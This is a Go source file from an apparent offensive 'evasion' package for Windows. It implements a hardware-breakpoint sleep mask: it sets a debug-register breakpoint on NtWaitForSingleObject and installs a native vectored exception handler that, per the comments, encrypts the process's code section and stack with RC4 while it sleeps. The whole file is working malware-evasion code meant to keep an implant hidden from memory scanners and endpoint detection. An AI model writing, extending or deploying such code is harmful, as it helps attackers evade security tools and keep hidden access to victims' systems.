//go:build windows && amd64

package evasion

import (
    "crypto/rand"
    "fmt"
    "runtime"
    "syscall"
    "unsafe"
)

var (
    hwbpKernel32               = syscall.NewLazyDLL("kernel32.dll")
    hwbpNtdll                  = syscall.NewLazyDLL("ntdll.dll")
    procAddVectoredHandler     = hwbpKernel32.NewProc("AddVectoredExceptionHandler")
    procRemoveVectoredHandler  = hwbpKernel32.NewProc("RemoveVectoredExceptionHandler")
    procGetThreadContext       = hwbpKernel32.NewProc("GetThreadContext")
    procSetThreadContext       = hwbpKernel32.NewProc("SetThreadContext")
    procGetCurrentThread       = hwbpKernel32.NewProc("GetCurrentThread")
    procNtWaitForSingleObject  = hwbpNtdll.NewProc("NtWaitForSingleObject")
)

const (
    contextAmd64          = 0x00100000
    contextDebugRegisters = contextAmd64 | 0x00000010
)

// hwbpCtx is the state the VEH reads. It is a package-level variable
// so the VEH can find it without a parameter. It must not be in any
// encrypted region.
// hwbpCtxType is a named type so the layout is documented in one
// place and the assembly offsets can be cross-checked against a
// single struct definition. The assembly reads fields at fixed
// offsets; any change here must be mirrored there.
type hwbpCtxType struct {
    ntWaitAddr  uintptr  // +0x00
    durationMs  uint32   // +0x08
    _           uint32   // +0x0C
    key         [16]byte // +0x10
    textBase    uintptr  // +0x20
    textSize    uintptr  // +0x28
    stackBase   uintptr  // +0x30
    stackSize   uintptr  // +0x38
    rc4Addr     uintptr  // +0x40
}

var hwbpCtx hwbpCtxType

// debugContext is the minimal CONTEXT fields the DR manipulation
// needs. The full structure is larger; we read and write only these.
// debugContext mirrors enough of the Windows CONTEXT structure to
// set and read the debug registers. The real structure is 0x4D0
// bytes; GetThreadContext writes the whole thing when
// ContextFlags requests any field, so the Go buffer must be the
// full size or the call corrupts adjacent memory.
type debugContext struct {
    P1Home       uint64
    P2Home       uint64
    P3Home       uint64
    P4Home       uint64
    P5Home       uint64
    P6Home       uint64
    ContextFlags uint32
    MxCsr        uint32
    SegCs        uint16
    SegDs        uint16
    SegEs        uint16
    SegFs        uint16
    SegGs        uint16
    SegSs        uint16
    EFlags       uint32
    Dr0          uint64
    Dr1          uint64
    Dr2          uint64
    Dr3          uint64
    Dr6          uint64
    Dr7          uint64
    Rax          uint64
    Rcx          uint64
    Rdx          uint64
    Rbx          uint64
    Rsp          uint64
    Rbp          uint64
    Rsi          uint64
    Rdi          uint64
    R8           uint64
    R9           uint64
    R10          uint64
    R11          uint64
    R12          uint64
    R13          uint64
    R14          uint64
    R15          uint64
    Rip          uint64
    // Floating point and vector state follows in the real
    // structure. It is not accessed here but must be present so
    // the total size matches CONTEXT (0x4D0 bytes).
    _ [0x4D0 - 0x100]byte
}

// hwbpHandleBreakpoint is the assembly breakpoint body. It is
// called by the native VEH below, not from Go.
func hwbpHandleBreakpoint(exceptionInfo uintptr)

// hwbpVEHNative is the native VEH, implemented in
// sleepmask_hwbp_windows_amd64.s. It is a raw assembly function,
// not a Go callback, and does not enter the Go runtime.
func hwbpVEHNative()

// hwbpVEHNativePC returns the raw PC of hwbpVEHNative so it can be
// passed to AddVectoredExceptionHandler without a
// syscall.NewCallback trampoline.
func hwbpVEHNativePC() uintptr

// maskedSleepHWBP performs an HWBP-based sleep.
func maskedSleepHWBP(ms uint32) error {
    runtime.LockOSThread()
    defer runtime.UnlockOSThread()

    if err := procNtWaitForSingleObject.Find(); err != nil {
        return fmt.Errorf("resolve NtWaitForSingleObject: %w", err)
    }
    rc4Addr, err := NativeRC4Addr()
    if err != nil {
        return err
    }
    textBase, textSize, err := TextSection()
    if err != nil {
        return fmt.Errorf("locate .text: %w", err)
    }
    stackBase, stackSize, err := currentStackRegion()
    if err != nil {
        return fmt.Errorf("locate stack: %w", err)
    }

    hwbpCtx.ntWaitAddr = procNtWaitForSingleObject.Addr()
    hwbpCtx.durationMs = ms
    hwbpCtx.textBase = textBase
    hwbpCtx.textSize = textSize
    hwbpCtx.stackBase = stackBase
    hwbpCtx.stackSize = stackSize
    hwbpCtx.rc4Addr = rc4Addr
    if _, err := rand.Read(hwbpCtx.key[:]); err != nil {
        return fmt.Errorf("generate key: %w", err)
    }

    // Install the VEH. The handler is a raw native function; it
    // does not enter the Go runtime.
    veh, _, _ := procAddVectoredHandler.Call(
        1, // first = 1, call before other handlers
        hwbpVEHNativePC())
    if veh == 0 {
        return fmt.Errorf("AddVectoredExceptionHandler failed")
    }
    defer procRemoveVectoredHandler.Call(veh)

    // Set DR0 to NtWaitForSingleObject.
    thread, _, _ := procGetCurrentThread.Call()
    var ctx debugContext

    // ContextFlags selects which CONTEXT fields are transferred.
    // It must be set before every GetThreadContext and every
    // SetThreadContext call; the kernel reads it each time to
    // decide what to copy.
    ctx.ContextFlags = contextDebugRegisters
    procGetThreadContext.Call(thread, uintptr(unsafe.Pointer(&ctx)))

    ctx.Dr0 = uint64(hwbpCtx.ntWaitAddr)
    // DR7 bits: L0=1 (local breakpoint on DR0), RW0=00 (execute),
    // LEN0=00 (1 byte).
    ctx.Dr7 |= 0x1

    ctx.ContextFlags = contextDebugRegisters
    procSetThreadContext.Call(thread, uintptr(unsafe.Pointer(&ctx)))

    // Trigger the wait. The VEH fires before NtWaitForSingleObject
    // executes and performs the encryption/syscall/decryption.
    //
    // NtWaitForSingleObject's third argument is a pointer to a
    // LARGE_INTEGER, not the value itself. A relative timeout is
    // negative, in 100-nanosecond units. Passing uintptr(ms) would
    // make the kernel dereference the integer `ms` as an address
    // and fault with STATUS_ACCESS_VIOLATION.
    //
    // The first argument is the current-process pseudo-handle,
    // (HANDLE)-1. The kernel recognizes this value and resolves it
    // to the calling process. Go's syscall package does not export
    // a CurrentProcess() helper, so the constant is used directly.
    var timeout int64 = -int64(ms) * 10000
    const currentProcessPseudoHandle = ^uintptr(0)
    procNtWaitForSingleObject.Call(
        currentProcessPseudoHandle,
        0, // alertable = FALSE
        uintptr(unsafe.Pointer(&timeout)))

    // Clear DR0.
    ctx.ContextFlags = contextDebugRegisters
    ctx.Dr0 = 0
    ctx.Dr7 &= ^uint64(0x1)
    procSetThreadContext.Call(thread, uintptr(unsafe.Pointer(&ctx)))

    return nil
}